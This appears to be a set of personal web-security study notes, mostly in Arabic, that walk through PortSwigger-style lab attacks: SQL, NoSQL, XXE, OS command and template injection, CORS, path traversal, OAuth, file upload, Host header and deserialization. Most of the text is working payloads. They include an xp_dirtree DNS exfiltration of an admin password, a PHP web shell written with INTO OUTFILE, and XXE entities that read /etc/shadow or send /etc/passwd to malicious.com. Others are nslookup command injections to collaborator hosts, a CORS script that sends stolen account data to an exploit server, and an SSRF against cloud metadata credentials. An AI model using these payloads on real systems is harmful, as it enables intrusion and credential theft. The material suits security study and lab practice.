- هذا النوع من الهجمات هو الأكثر شيوعًا وسهولة في التنفيذ. يحدث عندما يقوم التطبيق بتضمين مدخلات المستخدم مباشرة في استعلام SQL ويعرض النتائج في نفس القناة (مثل HTTP response).
- في هذه الحالة، يستطيع المهاجم إرسال استعلام ضار والحصول على البيانات أو تعديلها في نفس الطلب.

### **مثال**:

```jsx
http://example.com/product.php?id=1 UNION SELECT username, password FROM users--
```

### **آلية العمل**:

- المهاجم يستغل معلمة `id` المرسلة في الطلب. يقوم بتعديل قيمة المعلمة لتشمل استعلام SQL يهدف إلى سحب بيانات المستخدمين (مثل اسم المستخدم وكلمة المرور).

### **مراجعة الكود**:

- **ابحث عن استعلامات غير مؤمنة**: تحقق من وجود أي استعلام ديناميكي يحتوي على معلمات مباشرة من المستخدم، مثل:

```jsx
$query = "SELECT * FROM products WHERE id = " . $_GET['id'];

```

**تأكد من استخدام استعلامات معدة مسبقًا (Prepared Statements)**

:

```
$stmt = $pdo->prepare("SELECT * FROM products WHERE id = :id");
$stmt->execute(['id' => $_GET['id']]);

```

### 2. **Blind SQL Injection (حقن أعمى)**:

### **تعريف**:

- يحدث عندما لا يعرض التطبيق النتائج بشكل مباشر للمهاجم، ولكنه يسمح للمهاجم بقياس النجاح أو الفشل بناءً على التأثيرات الجانبية للاستعلام (مثل تأخير في الوقت أو تغييرات بسيطة في الصفحة).
- يتم تقسيمه إلى:
    - **Boolean-based Blind SQL Injection**: يعتمد على استعلامات صحيحة أو خاطئة (`True/False`).
    - **Time-based Blind SQL Injection**: يعتمد على تأخير في استجابة الخادم لاكتشاف الثغرة.

### **مثال**:

**Boolean-based**:

```jsx
http://example.com/product.php?id=1 AND 1=1--  (True)
http://example.com/product.php?id=1 AND 1=2--  (False)

```

**Time-based**:

```
http://example.com/product.php?id=1 AND IF(1=1, SLEEP(5), 0)--

```

- إذا تأخرت الاستجابة، يعرف المهاجم أن الاستعلام كان صحيحًا.

### **مراجعة الكود**:

- **تحقق من نقاط الإدخال غير المحمية**: تأكد من أن جميع المدخلات يتم التحقق منها قبل استخدامها في الاستعلامات. على سبيل المثال:

```jsx
if (is_numeric($_GET['id'])) {
// Proceed with the query
} else {
// Handle the error
}
```

**ختبر استعلامات بتوقيت محدد**: استخدم أدوات مثل Burp Suite لاختبار استجابات الخادم للتأكد من عدم وجود استعلامات ضارة تُسبب تأخيرًا ملحوظًا في الاستجابة.

### 3. **Out-of-band SQL Injection (حقن خارج النطاق)**:

### **تعريف**:

- هذا النوع أقل شيوعًا ويحدث عندما يتطلب الهجوم قناة منفصلة للإخراج. بدلاً من الحصول على النتائج في الصفحة المستهدفة، يتم إرسال البيانات إلى خادم خارجي يتحكم فيه المهاجم (مثل DNS أو HTTP).
- **Out-of-band** يكون مفيدًا عندما تكون النتائج غير مرئية للمهاجم مباشرةً أو لا يمكن استخدام القناة نفسها للاستجابة.

### **مثال**:

```jsx
'; declare @p varchar(1024); set @p=(SELECT password FROM users WHERE username='admin'); exec('master..xp_dirtree "//' + @p + '.example.burpcollaborator.net/a"')--
```

- هنا، يتم استخدام استعلام SQL لجلب كلمة مرور المستخدم `admin`، وإرسالها إلى خادم خارجي عبر طلب DNS.

### **مراجعة الكود**:

- **ابحث عن استدعاءات خارجية غير ضرورية**: تأكد من أن الكود لا يحتوي على أي استعلامات تتيح إجراء طلبات خارجية مثل `xp_cmdshell` أو `xp_dirtree`.
- **التحقق من أنظمة الاستضافة**: تأكد من أن قاعدة البيانات لا يمكنها الوصول إلى الإنترنت الخارجي أو إصدار اتصالات إلى خوادم غير موثوقة.

---

### **استراتيجيات الحماية أثناء مراجعة الكود**:

1. **استخدام الاستعلامات المعدة مسبقًا (Prepared Statements)**:
    - أفضل طريقة لحماية تطبيقك هي استخدام الاستعلامات المعدة مسبقًا التي تفصل بين الكود والبيانات. هذا يمنع المهاجم من التلاعب بالاستعلامات مباشرة.
    
    ```jsx
    $stmt = $pdo->prepare('SELECT * FROM users WHERE username = :username');
    $stmt->execute(['username' => $username]);
    ```
    
    - **التأكد من صحة المدخلات (Input Validation)**:
        - قم بتحديد أنواع البيانات المقبولة (مثل أرقام فقط أو عناوين بريد إلكتروني)، وتجنب السماح بإدخال حروف خاصة أو رموز قد تُستخدم في الاستعلامات الضارة.
    - **التشفير (Escaping)**:
        - إذا كان من الضروري تضمين المدخلات في استعلامات، تأكد من تشفير تلك المدخلات بشكل صحيح (Escaping). مثال:
        
        ```jsx
        $name = mysqli_real_escape_string($conn, $_POST['name']);
        ```
        

## **RCE (Remote Code Execution)** من خلال **SQL Injection**،

### **في MySQL:**

- **LOAD_FILE()**: يمكن استخدامها لقراءة ملفات من النظام.
    
    **مثال:**
    
    ```jsx
    SELECT LOAD_FILE('/etc/passwd');
    
    ```
    
    **INTO OUTFILE**: يمكن استخدامها لكتابة الملفات إلى النظام، وهو أمر مفيد لتحميل شل أو نص برمجي يمكن تنفيذه لاحقًا.
    
    **مثال:**
    
    ```jsx
    SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
    ```
    
    بعد تنفيذ هذا الاستعلام، يمكنك الوصول إلى الشل عبر: 
    `http://example.com/shell.php?cmd=whoami`
    

### **في MSSQL (Microsoft SQL Server):**

- **xp_cmdshell**: تتيح تنفيذ أوامر النظام مباشرة من خلال استعلام SQL.
    
    **مثال:**
    
    ```jsx
    EXEC xp_cmdshell 'dir';
    ```
    
    إذا كان لديك صلاحيات لتنفيذ هذه الدالة، يمكنك تشغيل أوامر مثل `whoami` أو `net user` لتنفيذ أوامر النظام والحصول على RCE.
    

### **في PostgreSQL:**

- **COPY TO PROGRAM**: هذه الدالة تتيح تنفيذ أوامر مباشرة من النظام.
    
    **مثال:**
    
    ```jsx
    COPY (SELECT '') TO PROGRAM 'whoami';
    ```
    

# **Server-side template injection**

njection point 
تحاول تعمل error
’ “ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

${{<%[%'"}}%\

to detect templet type

templet doc or sheetcheat (hack trickes)

# **XML external entity (XXE) injection**

https://github.com/payloadbox/xxe-injection-payload-list

## **Exploiting XXE using external entities to retrieve files**

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>

```

## **Exploiting XXE to perform SSRF attacks**

**<?xml version="1.0"?>**

**<!DOCTYPE foo [**

**<!ELEMENT foo (#ANY)>**

**<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>**

## **Blind XXE with out-of-band interaction**

**<!DOCTYPE root [**

**<!ENTITY xxe SYSTEM "http://malicious.com/?data=file:///etc/passwd">**

**]>**

**<root>&xxe;</root>**

`<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> ]>`

`<productId>`

 `&xxe;` 

`</productId>`  

## **Blind XXE with out-of-band interaction via XML parameter entities**

`<!DOCTYPE stockCheck` 

`[<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`

## **Exploiting blind XXE to exfiltrate data using a malicious external DTD**

1. Place the Burp Collaborator payload into a malicious DTD file:`<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;`
2. Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
3. 
4. Insert the following external entity definition in between the XML declaration and the `stockCheck` element:`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`

## **Exploiting blind XXE to retrieve data via error messages**

Click "Go to exploit server" and save the following malicious DTD file on your server:

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

nsert the following external entity definition in between the XML declaration and the `stockCheck` element:

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

## **Exploiting XInclude to retrieve files**

1. 

**<?xml version="1.0"?>**

**<!DOCTYPE lolz [**

**<!ENTITY test SYSTEM "https://example.com/entity1.xml">]>**

**<lolz><lol>3..2..1...&test<lol></lolz>

2**. `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>` ****

## **Exploiting XXE via image file upload**

**<svg xmlns="http://www.w3.org/2000/svg"**

**xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1"**

**height="200">**

**<image xlink:href="expect://ls"></image>**

**</svg>**

1. `<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>`

## **Exploiting XXE to retrieve data by repurposing a local DTD**

<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
'>
%local_dtd;
]>

## **XXE DoS (Denial of Service)**

Using recursive or large XML entities, attackers can overwhelm the system, causing memory or CPU exhaustion.

**Example:**

**<!DOCTYPE bomb [**

**<!ENTITY a "aaaaaaa" >**

**<!ENTITY b "&a;&a;&a;&a;&a;&a;" >**

**<!ENTITY c "&b;&b;&b;&b;&b;&b;" >**

**]>**

**<bomb>&c;</bomb>**

This recursive expansion will consume significant memory resource

# **OS command injection**

## **notes**

1- ;ls ⇒ ; to end any command before it

2-127.0.0.1&&ls ⇒ && to do the 2 orders

3-$(whoami) ⇒ to execute dircte

4-`whoami`.burbp-collebrator ⇒ `` may be doesn't restricted

5-xxx||ls ⇒ before ||  wrong

6-bypass like :
|;|
&$IFS&

 

## **simple case**

 Modify the `storeID` parameter, giving it the value `XX|whoami`.

XX IS wrong value.

## **Blind OS command injection with time delays**

1. Modify the `email` parameter, changing it to:`email=x||ping+-c+10+127.0.0.1||`

## **Blind OS command injection with output redirection**

1. odify the `email` parameter, changing it to:`email=||whoami>/var/www/images/output.txt||`
2. Now use Burp Suite to intercept and modify the request that loads an image of a product.
3. Modify the `filename` parameter, changing the value to the name of the file you specified for the output of the injected command:`filename=output.txt`

## **Blind OS command injection with out-of-band interaction**

1. Modify the `email` parameter, changing it to:`email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
2. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `email` parameter

## **Blind OS command injection with out-of-band data exfiltration**

1. Modify the `email` parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:`email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||`

# **Cross-origin resource sharing (CORS)**

## notes

what is same-origin-police ( SOP )
هي اتعملت عشان تمنع xss , CSRF
scripts running on a web page can only access resources (e.g., APIs, data) from the same domain, protocol, and port.

CORS 
هو بروتوكول يسمح لل WEBSITES 
مشاركه المعلومات مع بعض يعتمد عل 
Access-Control-Allow-Origin
Access-Control-Allow-Cradintiales

هتعرف منين انو مصاب بيها 
هتلاقي في قثسحخىث 
واحده من ال headers 
السابقون

## **CORS vulnerability with basic origin reflection**

تعمل test
Origin: zeyadalm.com

لو عمل allow for Origin

go 

<html>

<body>
<script>
var request = new XMLHTTpRequest();

var url = “[https://0a0000d903b8884b82e5891c00260051.web-security-academy.net/account](https://0a0000d903b8884b82e5891c00260051.web-security-academy.net/my-account)details”

request.open( ”GET” ,url, true );

request.withCredential = true;

request.send( null )
request.onreadystatechange = function () {
             if ( request.readyState == XMLHTTpRequest.DONE ){

                fetch(”/log?key” + request.responseText)

}}
</script>
</body>
</html>

## **CORS vulnerability with trusted null origin**

تعمل test
Origin: zeyadalm.com

لو عمل interna-server-error
Origin: null

لو عمل allow for Origin

<html>

<body>

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','[YOUR-LAB-ID.web-security-academy.net/accountDetails](http://your-lab-id.web-security-academy.net/accountDetails)',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='[YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText)](http://your-exploit-server-id.exploit-server.net/log?key=%27+encodeURIComponent(this.responseText));
};
</script>"></iframe>

</body>

</html>

## **CORS vulnerability with trusted insecure protocols**

accepte any subdomain from her host

# **Path traversal**

## **File path traversal, simple case**

Modify the `filename` parameter, giving it the value:`../../../etc/passwd`

## **File path traversal, traversal sequences blocked with absolute path bypass**

 Modify the `filename` parameter, giving it the value `/etc/passwd`.

## **File path traversal, traversal sequences stripped non-recursively**

Modify the `filename` parameter, giving it the value:`....//....//....//etc/passwd`

## **File path traversal, traversal sequences stripped with superfluous URL-decode**

Modify the `filename` parameter, giving it the value:`..%252f..%252f..%252fetc/passwd`

## **File path traversal, validation of start of path**

Modify the `filename` parameter, giving it the value:`/var/www/images/../../../etc/passwd`

## **File path traversal, validation of file extension with null byte bypass**

Modify the `filename` parameter, giving it the value:`../../../etc/passwd%00.png`

# **OAuth authentication**

## notes

**1-**

**تحليل 
trafic of OAuth requestes**:
(Authorization Code Flow أو Implicit Flow)

2-**Redirect URIs**:

- تأكد من وجود تحكم قوي في توجيه المستخدم بعد تسجيل الدخول، لتجنب ثغرات مثل "Open Redirect" أو "Redirect URI Manipulation".
- مثال ثغرة: إذا كان تطبيقك يقبل إعادة توجيه غير مقيدة، يمكن للمهاجم توجيه المستخدم إلى موقع ضار بعد التفويض.

```jsx
https://example.com/oauth/callback?redirect_uri=https://evil.com
```

3-

- **تحقق من صحة الرموز (Tokens)**:
    - تأكد من أن **Access Tokens** و **Refresh Tokens** يتم إنشاؤها وتخزينها بشكل آمن.
    - تحقق من حماية الرموز ضد الهجمات مثل **Token Hijacking** أو **Token Replay**.
- **اختبار التفويض الصحيح**:
    - تأكد من أن الرموز المصدرة لها النطاقات والصلاحيات المطلوبة فقط، وليس أكثر من اللازم.
- **حماية "Authorization Code"**:
    - في تدفق "Authorization Code"، تأكد من أن الكود الذي يتم تبادله محمي باستخدام بروتوكولات مثل **PKCE (Proof Key for Code Exchange)**.
    
    ### الأمثلة:
    
    إذا لم تكن عمليات إعادة التوجيه محمية بشكل كافٍ، يمكنك اختبار ثغرات إعادة التوجيه باستخدام:
    
    ```jsx
    https://example.com/oauth/authorize?client_id=123&redirect_uri=https://evil.com
    ```
    

## **Authentication bypass via OAuth implicit flow**

**تحليل طلبات OAuth**:

1-
ابحث عن طلب GET يبدأ بـ `/auth?client_id=[...]`، 
والذي يمثل بداية
 (Authorization Request).

2-

**فحص طلب POST /authenticate**:

بعد قبول Authorization 

يتم إرسال طلب **POST** 

يحتوي على بيانات المستخدم والوصول إلى توكن (Access Token) إلى مسار

 `/authenticate` في الموقع الرئيسي.

3-

قم بتعديل حقل البريد الإلكتروني في طلب

POST /authenticate

ليكون

`carlos@carlos-montoya.net` بدلاً من بريدك الشخصي

## **SSRF via OpenID dynamic client registration**

1-
انتقل إلى رابط ملف التكوين الخاص بخدمة OAuth:

```
https://oauth-YOUR-OAUTH-SERVER.oauth-server.net/.well-known/openid-configuration

```

Notice that the client registration endpoint is located at `/reg`

2-

في

**Burp Repeater**

، قم بإنشاء طلب

**POST**

لتسجيل تطبيق عميل جديد مع خدمة OAuth. يمكنك تضمين قائمة من عناوين URI المسموح بها:

```jsx
POST /reg HTTP/1.1
Host: [oauth-YOUR-OAUTH-SERVER.oauth-server.net](http://oauth-your-oauth-server.oauth-server.net/)
Content-Type: application/json
{
"redirect_uris" : [
"[https://example.com](https://example.com/)"
]
}
```

- أرسل الطلب ولاحظ أنك قد سجلت التطبيق الجديد بنجاح دون الحاجة إلى أي مصادقة.
- ستتلقى استجابة تحتوي على **client_id** جديد لتطبيقك المسجل.
**استغلال خاصية الـ logo_uri**:

انتقل إلى طلب `GET /client/CLIENT-ID/logo`

لذي يتم فيه استرجاع شعار التطبيق. لاحظ أن التطبيقات المسجلة يمكنها تعيين عنوان URL لشعارها باستخدام الخاصية `logo_uri`.

**ضمين Payload عبر Burp Collaborator**:

- قم بتعديل طلب **POST /reg** السابق لتضمين خاصية `logo_uri`، واضغط بزر الماوس الأيمن واختر **Insert Collaborator payload** لإدراج رابط Burp Collaborator:

```jsx
POST /reg HTTP/1.1
Host: [oauth-YOUR-OAUTH-SERVER.oauth-server.net](http://oauth-your-oauth-server.oauth-server.net/)
Content-Type: application/json
{
"redirect_uris" : [
"[https://example.com](https://example.com/)"
],
"logo_uri" : "[https://BURP-COLLABORATOR-SUBDOMAIN](https://burp-collaborator-subdomain/)"
}
```

- أرسل الطلب وسجل التطبيق الجديد واحفظ 
**client_id** الجديد من الاستجابة.
- **تأكيد الهجوم باستخدام Burp Collaborator**:
    - انتقل إلى طلب **GET /client/CLIENT-ID/logo** وقم بتحديث **CLIENT-ID** باستخدام **client_id** الجديد.
    - أرسل الطلب وافتح علامة التبويب الخاصة بـ **Collaborator** للتحقق من أي تفاعلات جديدة. لاحظ أنه تم محاولة جلب الشعار من خادم Collaborator، مما يؤكد نجاح الهجوم.
- **تنفيذ الهجوم الحقيقي باستخدام URL الهدف**:
    - عد إلى طلب **POST /reg**، واستبدل عنوان `logo_uri` برابط الوصول إلى البيانات الحساسة

```jsx
"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
```

- 
    - أرسل الطلب واحصل على **client_id** الجديد.
- **الحصول على البيانات الحساسة**:
    - عد إلى طلب **GET /client/CLIENT-ID/logo** واستبدل **client_id** بالقيمة الجديدة التي حصلت عليها.
    - أرسل الطلب وتحقق من الاستجابة. ستحتوي على البيانات الحساسة

## **OAuth account hijacking via redirect_uri**

حدد طلب authorization request

الذي يبدأ بـ `GET /auth?client_id=[...]`،

**تجربة التحكم في redirect_uri**:

ستبدل قيمة

**redirect_uri**

بعنوان سيرفر الاستغلال الخاص بك. على سبيل المثال:

```
https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net

```

رسل الطلب وتابع إعادة التوجيه إلى سيرفر الاستغلال. انتقل إلى **access log** في سيرفر الاستغلال ولاحظ وجود مدخل يحتوي على **authorization code**. هذا يؤكد أنه يمكنك تسريب الأكواد إلى نطاق خارجي.

كمل clickjacking

## **Stealing OAuth access tokens via an open redirect**

## **Stealing OAuth access tokens via a proxy page**

# **File upload**

ايه الfile ⇒  

```jsx
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

1- تغير ال 
.php to .png 
او المسموح بيه
2-تغير ال 
Content-Type:

3- ترفع صوره و تحط ف نصها الكود 
4-**Web shell upload via path traversal**

1. `Content-Disposition: form-data; name="avatar"; filename="../exploit.php"`
2. `filename="..%2fexploit.php"`

4-**upload via extension blacklist bypass (حاول يلا انت مستني كل حاجه عل الجاهز )**

```jsx
This maps an arbitrary extension (.l33t) 
to the executable MIME type application/x-httpd-php. 
As the server uses the mod_php module, 
it knows how to handle this already.
- Change the value of the `filename` parameter to `.htaccess`.
- Change the value of the `Content-Type` header to `text/plain`.
- Replace the contents of the file (your PHP payload)
 with the following Apache directive:`AddType application/x-httpd-php .l33t`
    
 This maps an arbitrary extension (`.l33t`) 
 to the executable MIME type `application/x-httpd-php`. 
 As the server uses the `mod_php` module, it knows how to handle this already.

Send the request and observe that the file was successfully uploaded.

Use the back arrow in Burp Repeater 
to return to the original request for uploading your PHP exploit.

Change the value of the `filename` parameter from `exploit.php` 
to `exploit.l33t`. Send the request again and notice 
that the file was uploaded successfully
```

**5-upload via obfuscated file extension ⇒** `filename="exploit.php%00.jpg"`
6-**Remote code execution via polyglot web shell upload
7-Web shell upload via race condition**

# **Information disclosure**

# **HTTP Host Header Attacks**

## **Basic password reset poisoning**

1-Forgot your password?

2-
لاحظ أنك تلقيت رسالة بريد إلكتروني تحتوي على رابط لإعادة تعيين كلمة المرور.
 يحتوي عنوان URL
 على معلمة الاستعلام `temp-forgot-password-token`.

3-

يمكنك تغيير
Host header
إلى 
قيمة تعسفية (arbitrary value)
ومع ذلك ستظل قادراً على تفعيل إعادة تعيين كلمة المرور.

غير ال 
arbitrary value
الي 
[YOUR-EXPLOIT-SERVER-ID.exploit-server.net](http://your-exploit-server-id.exploit-server.net/)
+ غير ال id or email 

4-

- انتقل إلى خادم الاستغلال وافتح سجل الوصول (access log).
- ستلاحظ وجود طلب لـ `GET /forgot-password` مع معلمة `temp-forgot-password-token` التي تحتوي على رمز إعادة تعيين كلمة مرور هذا الشخص

## **Host header authentication bypass**

GET /admin
مع تغير ال
host : 127.0.0.1

## **Routing-based SSRF**

نفس الكلام بس حاول بعنف عل ال ip & port 

## SSRF via flawed request parsing

لو عرفت تعمل كدا 

```jsx
GET [https://YOUR-LAB-ID.web-security-academy.net/](https://your-lab-id.web-security-academy.net/)
Host: BURP-COLLABORATOR-SUBDOMAIN
```

تقدر تحط بدل ال 
COLLABORATOR 
localhost 

# **NoSQL injection**

## notes

```jsx
example.com/product/lookup?category=fizzy
بيكون شكلها ف ال DB
كدا

this.category == 'fizzy'
```

```jsx
Detection test

'"`{
;$Foo}
$Foo \xYZ

ecample.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

if the response change is a good indecator 

other exmaples
 

```
this.category == '''
this.category == '\''

```

### **conditions test True and False**

```
'||'1'=='1
this.category == 'fizzy'||'1'=='1'

```

إضافة حرف null (\u0000) لتعطيل الشروط الإضافية:

```
this.category == 'fizzy' && this.released == 1

example.com/product/lookup?category=fizzy'%00
this.category == 'fizzy'\u0000' && this.released == 1

```

(NoSQL Operator Injection)

تسمح بتحديد شروط خاصة على البيانات التي يجب استرجاعها

- **`$where`**: يطابق المستندات التي تحقق تعبير JavaScript.
- **`$ne`**: يطابق كل القيم التي لا تساوي قيمة معينة.
- **`$in`**: يطابق جميع القيم المحددة في مصفوفة.
- **`$regex`**: يحدد المستندات حيث القيم تطابق تعبيرًا منتظمًا (Regular Expression).

nested objects

```json
{"username":"wiener"}
{"username":{"$ne":"invalid"}}
اي اسم لايساوي invalid

```

if inject in URL :

```makefile
username=wiener
username[$ne]=invalid
```

إذا لم يعمل ذلك، يمكنك تجربة التالي:

- تحويل طريقة الطلب من **GET** إلى **POST**.
- تغيير ترويسة `Content-Type` إلى `application/json`.
- إضافة JSON إلى نص الرسالة.
- حقن المشغلات في JSON.

EX:
 إذا كان التطبيق يتلقى اسم المستخدم وكلمة المرور في رسالة **POST:**

```json
{"username":"wiener","password":"peter"}
{"username":{"$ne":"invalid"},"password":"peter"}
**BYPASS**
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
**BYPASS SPICIFIC ACCOUNT** 
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

**سناريوهات اكثر توضيحا**

**1-Not Equal Operator**

حيث قيمة `username` لا تساوي `invalid`

```json
{"username":"john","password":"password123"}

{"username":{"$ne":"invalid"},"password":"password123"}
```

2-Logical OR Operator()

- إرجاع أي حساب حيث كلمة المرور لا تساوي `invalid`،
- أو أي حساب حيث كلمة المرور لا تساوي قيمة فارغة.

```json
{"username":"admin","password":"adminpassword"}

{"username":"admin","password":{"$or":[{"$ne":"invalid"},{"$ne":""}]}}
```

3-Greater Than Operator
`$gt` يقوم بإرجاع جميع المستندات حيث العمر (`age`) أكبر من 10.

```json
{"age":25}
{"age":{"$gt":10}}
```

4-Regular Expression Operator
`$regex` يقوم بمطابقة كل الأسماء التي تبدأ بـ `john`

```json
{"username":"john_doe"}
{"username":{"$regex":"^john"}}
```

5-Array Matching Operator
يقوم بمطابقة أي من القيم الموجودة في المصفوفة. في هذه الحالة، يقوم MongoDB بالتحقق من أسماء المستخدمين "john"، "admin"، أو "superuser”

```json
{"username":"john"}
{"username":{"$in":["john","admin","superuser"]}}
```

**6-JavaScript Condition Operator**

يسمح لك بإدخال تعبير JavaScript. في هذا المثال، يتم إرجاع جميع المنتجات حيث يكون سعرها (`price`) أكبر من 100

```json
{"product_id":12345}

{"product_id":{"$where":"this.price > 100"}}
```

**7-Equality Operator
للتحقق مما إذا كان اسم المستخدم يساوي "admin".**

```json
{"username":"user","password":"pass123"}

{"username":{"$eq":"admin"},"password":"pass123"}
```

**8-Field Existence Operator**
يتحقق من وجود الحقل. في هذا المثال، قد يتم تجاهل أي استعلام للتحقق من البريد الإلكتروني إذا كان التطبيق لا يعالج الاستعلام بشكل صحيح

```json
{"email":"user@example.com"}

{"email":{"$exists":false}}

```

**9-Negation Operator**
يعكس نتيجة الشرط. في هذا المثال، يتم استخدامه للتحقق من أن الحالة ليست "inactive

```json
{"status":"active"}

{"status":{"$not":{"$eq":"inactive"}}}
```

**10-Greater Than or Equal Operator**
يحدد أن القيمة يجب أن تكون أكبر من أو تساوي 2000

```json
{"year_of_birth":1990}

{"year_of_birth":{"$gte":2000}}
```

**11-All Elements Operator**
يتحقق من أن جميع العناصر موجودة في القائمة

```json
{"interests":["coding","hacking"]}
{"interests":{"$all":["coding","hacking","admin"]}}
```

## **Exploiting NoSQL injection to extract data (JS)**

- قواعد بيانات **NoSQL**، مثل **MongoDB**، قد تسمح بتشغيل أكواد **JavaScript** عند استخدام Operators معينة مثل `$where` أو `mapReduce()`.
- السيناريو
**استغلال $where**

```jsx
[example.com/user/lookup?username=admin](http://e.com/user/lookup?username=admin) 
+
{"$where":"this.username == 'admin'"}

=>  admin' && this.password[0] == 'a' || 'a'=='b

=>{"$where":"this.username == 'admin' && this.password[0] == 'a' || 'a'=='b'"}

يحاول مقارنة الحرف الأول من كلمة المرور. إذا كان الحرف الأول هو 'a'، فسيقوم الاستعلام بإرجاع البيانات.

إذا لم يكن 'a'، سيعيد الاستعلام قيمة خاطئة، ولكن سيتم تجاهل ذلك بسبب الجزء || 'a'=='b' الذي سيجعل النتيجة دائمًا صحيحة.

```

**مثال آخر: استخدام الدوال المدمجة مثل match()
 للتحقق مما إذا كانت كلمة المرور تحتوي على أرقام
:**

```jsx
[example.com/user/lookup?username=admin](http://e.com/user/lookup?username=admin) 
+
{"$where":"this.username == 'admin'"}

=>

admin' && this.password.match(/\d/) || 'a'=='b

{"$where":"this.username == 'admin' && this.password.match(/\\d/) || 'a'=='b'"}

```

**يمكن للمهاجمين أيضًا استخدام دوال JavaScript أخرى مثل:**

- **length: لمعرفة طول كلمة المرور**

```jsx
admin' && this.password.length > 5 || 'a'=='b

```

**slice(): لاستخراج مقاطع من البيانات.**

```jsx
admin' && this.password.slice(0,2) == 'pa' || 'a'=='b
```

## **Exploiting NoSQL operator injection to extract unknown fields**

**Identifying Field Names
Object.keys()**
to check first field in the user object and returns the first character of the field name

```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

**Exfiltrating Data Using Operators using $regex
if the response is diffrence than invalid password THAT IS flag**

```json
1-
{"username":"admin","password":{"$regex":"^.*"}}
2-
{"username":"admin","password":{"$regex":"^a.*"}}

```

## Timing-Based Injection

```json
{"$where": "sleep(5000)"}
```

The following timing based payloads will trigger a time delay if the password beings with the letter `a`:

```jsx

admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'

------------------------------------------------------------------------
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'

```

# **Race conditions**

## notes

جرب تعمل جروب من نفس الركوست و تبعتهم ف نفس الوقت

جرب تعمل جروب و تغير قيمه كل واحد 
Turbo Intruder,

## **Limit overrun race conditions**

## **Bypassing rate limits via race conditions**

## **Multi-endpoint race conditions**

## **Single-endpoint race conditions**

## **Exploiting time-sensitive vulnerabilities**

## **Partial construction race conditions**

# **Insecure deserialization**

## NOTES

1-
ما هي Insecure Deserialization؟(object injection)
 هي ثغرة تحدث عندما يقوم تطبيق ب

deserializes untrusted data

allowing attackers to insert malicious objects

2-
في التطبيقات المكتوبة بلغة
 Java
يتم استخدام 
`ObjectInputStream` 
لفك التسلسل

3-
في PHP

يحدث فك التسلسل باستخدام الدالة
unserialize()

4-PHP ⇒Tzo0O……….

5-JAVA ⇒rooA

## **Modifying serialized objects**

Notice that the cookie is in fact a serialized PHP object

```
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```

## **Modifying serialized data types**

examine the session cookie

```
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```

## **Using application functionality to exploit insecure deserialization**

study the session cookie 

```
O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
```

1. `s:11:"avatar_link";s:23:"/home/carlos/morale.txt"`

## **Arbitrary object injection in PHP(gadget chain)**

O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
`O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}`

## **Exploiting Java deserialization with Apache Commons**

## **Exploiting PHP deserialization with a pre-built gadget chain**

## **Exploiting Ruby deserialization using a documented gadget chain**

## **Developing a custom gadget chain for Java deserialization**

## **Developing a custom gadget chain for PHP deserialization**

## **Using PHAR deserialization to deploy a custom gadget chain**

## how to get RCE from **deserialization**

# **Business logic**

## **Excessive trust in client-side controls**

intercept & change value of price in the request  

